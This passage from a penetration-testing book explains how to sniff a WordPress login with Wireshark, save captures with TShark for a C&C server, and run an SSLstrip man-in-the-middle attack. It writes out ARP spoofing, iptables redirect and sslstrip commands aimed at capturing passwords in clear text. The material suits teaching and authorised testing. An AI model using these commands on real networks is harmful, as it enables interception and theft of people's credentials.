+This method will eat up memory, so it is recommended to work with 
+live data rather than archiving large amounts of packet capture files 
+on a Raspberry Pi due to its limited storage capabilities. A possible 
+workaround is storing and exporting network captures to an external 
+C&C server to meet the penetration testing purpose.
+Once you select an interface, it will bring up the Wireshark live capture feed page. 
+You will probably see a ton of data including the ARP poisoning packets, shown 
+in black, if you are using the ARP spoofing method to get traffic through your 
+Raspberry Pi:
+One of Wireshark's popular features is being able to sort through tons of logs very 
+quickly. You can enter the information into the filter line such as a particular host, 
+type of packet, and so on, and quickly narrow down to a specific packet of interest. 
+Let's walk you through an example attack.
+www.it-ebooks.info
+
+Chapter 3[ 81 ]Capturing a WordPress password example
+In this example, we're going to log in to a WordPress website as an administrator 
+with the target system before stopping the Wireshark live capture. This will capture 
+the host's login session so that the attacker can view the captured password. To stop 
+the Wireshark capture, click on the red square. It may take a minute or so for the 
+Wireshark interface to catch up with the display.
+At this point, we want to look for the WordPress login information. This can be 
+found in a POST packet, meaning data sent from a user to a system such as a 
+username and password. We can use the filter to filter out traffic and zero in on our 
+target data. So, for this example, we're going to look for the target's IP address using 
+the ip.src == command and the http request login information using the http.
+request.full_url  command, then click on Apply  to execute it. You can see the 
+command in the previous screenshot in the green filter area and also what the output 
+looks like once filtered.
+Notice that the color of the filter section is green after we entered the 
+command string. Wireshark verifies text as you enter it and offers 
+possible filter expressions. If the output has an error, the filter box 
+color will turn red.
+So, we use the following command to filter out the target IP address:
+ip.src == [target IP] and http.request.full_url
+To avoid the Raspberry Pi crashing, it is recommended that you 
+pause a network capture and wait a minute prior to entering 
+filtering expressions.
+It may take a few minutes for Wireshark to weed out all the unwanted data once you 
+apply a filter. You will see a progress window as Wireshark processes the filter on 
+the captured data.
+We can ignore the GET packets since that is the host loading the website prior to 
+logging in as well as the TCP packets since they are the ARP spoof data. To quickly 
+look through the data, we can click on one of the tabs such as the Protocol  tab to sort 
+the data in Alphabetical  order based on that tab's function. Doing this will take a 
+few seconds and will once again bring up a process tab during the compute time.
+www.it-ebooks.info
+
+Penetration Testing[ 82 ]What we want is the POST line that shows when a user submits information to the 
+server.  This is shown highlighted in the following screenshot:
+To view the raw packets, we need to click on this packet line, right-click on it to bring 
+up the options, and then select Follow TCP String . This will open a process string 
+and bring up the raw login data:
+www.it-ebooks.info
+
+Chapter 3[ 83 ]In the raw data capture previously shown, we can see lots of useful data (key items 
+are distorted since this is a live server). The line to note is the one containing  
+log=  showing the user name and pwd=  showing the password in clear text.
+TShark
+TShark is the command-line version of Wireshark. If you have to run Wireshark from 
+a Raspberry pi, TShark is the best option. Consider TShark as an alternative to using 
+tcpdump for capturing packets.
+To run TShark, simply type tshark  in a command-line terminal and it will select an 
+available interface. You can also manually select the interface to capture by using 
+tshark eth0  to select the eth0  port. The following screenshot shows tshark  doing 
+a basic capture:
+You will most probably want to capture data to a file so that you can export it to your 
+C&C server. You can specify a file to save the captured data by using the tshark –w 
+[file name].cap  command. The following screenshot shows running a capture 
+that saves the data to a file named capture.cap . We can show this file using the ls 
+command once we stop the capture using the Ctrl + C command:
+www.it-ebooks.info
+
+Penetration Testing[ 84 ]If you don't stop a TShark capture, at some point you will run out of memory. 
+To avoid this, you can specify how many packets you want to capture by adding 
+–c [number]  to the command. In our example, we could have used the command 
+tshark –c 500 –w capture.cap  to capture five hundred packets before stopping. 
+This is the ideal situation when performing a targeted penetration test, meaning you 
+specify the available storage space for your capture, save that information to a file, 
+and export it to your C&C server using the steps covered in this book. We covered 
+a similar process by creating a script that did this using tcpdump. You could adjust 
+that script to run TShark rather than tcpdump if you want an alternative option for 
+the packet capture tool.
+Beating HTTPS with SSLstrip
+One defense that host systems have against man-in-the-middle attacks on web 
+servers is SSL encryption. You typically run into this when you access a sensitive 
+service such as online banking or online shopping. Many browsers showcase that 
+HTTPS is in place by displaying a little lock giving the end user a sense of security.
+Thanks to a security researcher Moxie Marlinspike, this layer of defense can be 
+bypassed using SSLstrip. SSLstrip works by proxying HTTPS requests from the 
+victim and sending them using HTTP. The HTTP traffic is not encrypted, making it 
+vulnerable to eavesdropping. Once SSLstrip forces the HTTP connection, an attacker 
+can use tcpdump to view the unencrypted login credentials of people accessing 
+accounts such as Facebook.
+The HTTP Strict Transport Security  (HSTS ) specification was subsequently 
+developed to combat these attacks; however, deployment of HSTS has been slow. 
+Also, some businesses such as online banking are adopting the policy of not hosting 
+an HTTP version of their website, which would show a message saying "page not 
+found" on the host if this attack is performed. Unfortunately, many other businesses 
+would rather host an HTTP and HTTPS version of their website to avoid looking 
+as if their website is down regardless of the risk of a man-in-the-middle attack with 
+SSLstrip. For this and other reasons, SSLstrip attacks are still commonly seen today.
+Let's look at an SSLstrip attack between a host and the Internet, which is trying 
+to access his/her Facebook account. The following screenshot shows how 
+communication should happen between the user and Facebook:
+www.it-ebooks.info
+
+Chapter 3[ 85 ]
+When a man-in-the-middle SSLstrip attack is involved, the SSL encrypted session 
+is prevented and HTTP responses are sent back to the victim. As they send 
+information, they do not know that the information is in plain text and is easy  
+to view with a network sniffer.
+The following image shows the SSL connection intercepted by SSLstrip:
+The use case for a Raspberry Pi with Kali Linux is placing the attack system on 
+a network and scanning for systems to attack. Using the steps in this section, an 
+attacker can perform a man-in-the-middle SSLstrip attack against internal users  
+with the goal of mining user passwords.
+Launching an SSLstrip attack
+An SSLstrip attack is launched using the following steps:
+1. The Kali Linux ARM image doesn't come with an installed SSLstrip, so 
+before we do anything, we must download it. Issue the apt-get install 
+sslstrip  command to download the utility.
+2. The first thing we need to do once we install SSLstrip is launch an ARP 
+spoof. This was covered earlier in this chapter, so we will quickly cover  
+the ARP spoofing process. To summarize the steps, do the following:
+ °Enable IP forward using echo 1 > /proc/sys/net/ipv4/ip_
+forward
+ °Identify the default gateway and subnet mask using netstat –nr
+www.it-ebooks.info
+
+Penetration Testing[ 86 ] °Use nmap  to identify a target on the network using nmap –Rsn 
+[network/subnet mask]
+ °Start ARP cache poisoning using arpspoof –i eth0 –t [target 
+IP] –r [default gateway]
+ °This will show traffic from the ARP cache poisoning. Leave this 
+window open
+Once this is running, you should start seeing the ARP spoofing traffic as 
+shown in the following screenshot:
+3. Once the ARP cache poisoning is set up, open a new terminal window 
+to set up port redirection using iptables . This enables the attacker to 
+capture traffic sent to an HTTP server on TCP 80 and redirect that traffic 
+to the SSLstrip listener port. The attacker can use any applicable value. For 
+example, we will show this using 8080  for both the destination port and the 
+redirection destination using the following command.
+iptables –t nat –A PREROUTING –p tcp --destination-port 80 -j 
+REDIRECT --to-port 8080
+The selected redirection destination must also be used for setting the listener 
+port for the SSLstrip.
+The following screenshot shows the launch of the preceding command:
+To disable the PREROUTING  rule in this command, replace the –A with a 
+–D to clear all table rules used.
+www.it-ebooks.info
+
+Chapter 3[ 87 ]• To flush, use the command iptables –t nat –F
+• To verify, use the command iptables –t nat –L
+ARP spoof has many configuration options. You can use the 
+man tables  command to see additional options.
+4. Launch the SSLstrip attack. For this example, we will use TCP 8080  as the 
+listening port. So, the command will be sslstrip -l 8080,  as shown  
+in the following screenshot:
+To see the results of your attack, open another terminal window and type 
+tail –n 50 –f sslstrip.log .
+To test this attack, open a web browser on a victim's system and access a 
+system requiring access using SSL encryption such as online mail. Go back 
+to your terminal window showing the sslstrip.log  file and you should 
+see the username and password in clear text, as highlighted in the following 
+screenshot. This data can be packaged in a text file so that an attacker can 
+retrieve it at a later time.
+www.it-ebooks.info
+
+
+[Note: PDF has 208 pages, only first 100 pages extracted]
